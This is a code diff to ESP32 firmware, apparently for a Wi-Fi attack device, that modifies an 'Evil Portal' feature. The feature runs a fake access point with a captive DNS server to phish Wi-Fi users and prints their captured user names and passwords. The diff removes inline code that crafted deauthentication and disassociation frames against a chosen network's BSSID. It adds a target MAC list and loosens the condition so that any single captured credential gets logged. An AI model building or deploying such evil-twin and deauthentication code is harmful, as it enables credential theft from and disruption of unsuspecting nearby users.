@@ -12,21 +12,8 @@ AsyncWebServer server(80);
 DNSServer dnsServer;
 const IPAddress AP_IP(172, 0, 0, 1);
 
-class CaptiveRequestHandler : public AsyncWebHandler {
-    public:
-        CaptiveRequestHandler() {}
-        virtual ~CaptiveRequestHandler() {}
-
-        bool canHandle(AsyncWebServerRequest *request) { return true; }
-
-        void handleRequest(AsyncWebServerRequest *request) {
-            request->send(200, "text/html", index_html);
-        }
-};
-
-uint8_t deauth_frame[sizeof(wifi.deauth_frame_packet)];
+LinkedList<EPDeauthList>* ep_target_mac_list;
 String str_deauth_frame = "";
-uint8_t disassoc_frame[sizeof(wifi.disassoc_frame_packet)];
 
 
 EvilPortalAddtional::EvilPortalAddtional() 
@@ -46,6 +33,7 @@ void EvilPortalAddtional::shutdownServer() {
     server.end();
     dnsServer.stop();
     WiFi.disconnect();
+    WiFi.mode(WIFI_OFF);
     Serial.println("[INFO] Successfully Shutdown Portal");
 }
 
@@ -57,6 +45,7 @@ void EvilPortalAddtional::main() {
     this->has_ap = false;
 
     //html_files = new LinkedList<String>();
+    ep_target_mac_list = new LinkedList<EPDeauthList>();
 
     Serial.println("[INFO] Successfully setup Evil Portal");
 }
@@ -64,7 +53,7 @@ void EvilPortalAddtional::main() {
 void EvilPortalAddtional::loop() {
     if (this->has_ap && this->has_html) {
         dnsServer.processNextRequest();
-        if (this->name_received && this->password_received) {
+        if (this->name_received || this->password_received) {
             this->name_received = false;
             this->password_received = false;
             Serial.println("[INFO] User Name: " + user_name);
@@ -157,30 +146,13 @@ bool EvilPortalAddtional::htmlSetup() {
     return true;
 }
 
-bool EvilPortalAddtional::apSetup(String essid, bool _deauth) {
+bool EvilPortalAddtional::apSetup(String essid) {
     String ap_name = "";
     user_name = "";
     password = "";
     if (essid == "") {
         for (int i = 0; i < access_points->size(); i++) {
             if (access_points->get(i).selected) {
-                if (_deauth) {
-                    if (!wifi.dualBandInList) {
-                        memcpy(deauth_frame, wifi.deauth_frame_packet, sizeof(wifi.deauth_frame_packet));
-                        memcpy(disassoc_frame, wifi.disassoc_frame_packet, sizeof(wifi.disassoc_frame_packet));
-                        esp_wifi_set_channel(access_points->get(i).channel, WIFI_SECOND_CHAN_NONE);
-                        vTaskDelay(50 / portTICK_PERIOD_MS);
-                        memcpy(&deauth_frame[10], access_points->get(i).bssid, 6);
-                        memcpy(&deauth_frame[16], access_points->get(i).bssid, 6);
-
-                        memcpy(&disassoc_frame[10], access_points->get(i).bssid, 6);
-                        memcpy(&disassoc_frame[16], access_points->get(i).bssid, 6);
-                    } else {
-                        str_deauth_frame = "RTL_DEAUTH -am {";
-                        String src_mac = macToString(access_points->get(i).bssid); // BSSID
-                        str_deauth_frame += src_mac + "} -c {" + String(access_points->get(i).channel) + "}";
-                    }
-                }
                 ap_name = access_points->get(i).essid;
                 break;
             }
